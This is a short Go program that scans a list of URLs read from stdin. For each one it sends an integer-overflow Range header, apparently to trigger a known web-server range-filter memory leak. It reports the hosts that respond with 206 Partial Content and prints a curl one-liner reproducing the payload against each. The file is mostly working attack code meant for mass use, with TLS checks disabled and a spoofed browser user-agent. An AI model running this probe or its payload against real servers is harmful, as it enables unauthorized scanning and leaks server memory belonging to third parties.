package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/projectdiscovery/retryablehttp-go"
)

func main() {
	flag.Parse()

	cl := NewClient()

	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		url := sc.Text()
		baseResp, err := cl.DoRequest(url, "")
		if err != nil {
			log.Fatalf("error making baseline request: %+v", err)
		}

		if !cl.CheckVuln(baseResp) {
		    continue
		}
	}
}

type Client struct {
	*retryablehttp.Client
}

func NewClient() *Client {
	var retryablehttpOptions = retryablehttp.DefaultOptionsSingle
	transport := &http.Transport{
		MaxIdleConnsPerHost: -1,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: true,
	}
	client := retryablehttp.NewWithHTTPClient(&http.Client{
		Transport:     transport,
		CheckRedirect: nil,
	}, retryablehttpOptions)

	return &Client{client}
}

func (cl *Client) DoRequest(u string, rh string) (resp *http.Response, err error) {
	req, err := retryablehttp.NewRequest("GET", u, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15")
	if rh != "" {
		req.Header.Add("Range", rh)
	}

	resp, err = cl.Do(req)
	return
}

// CheckVuln injects HTTP request with an integer overflow Range header, and
// checks vulnerability based on a HTTP response that includes 206 Partial Content and Content-Range header
func (cl *Client) CheckVuln(r *http.Response) bool {
	contentLength := r.ContentLength
	bytesLength := contentLength + 623
	rangeHeader := fmt.Sprintf("bytes=-%d,-9223372036854%d", bytesLength, 776000 - bytesLength)

	url := r.Request.URL.String()
	resp, err := cl.DoRequest(url, rangeHeader)
	if err != nil {
		log.Fatalf("request error: %+v", err)
	}

	if resp.StatusCode == 206 && resp.Header.Get("Content-Range") != "" {
		fmt.Printf("%s\tcurl -ik %s -X GET -r -%d,-9223372036854%d\n", url, url, bytesLength, 776000 - bytesLength)
	    return true
	}
	return false
}

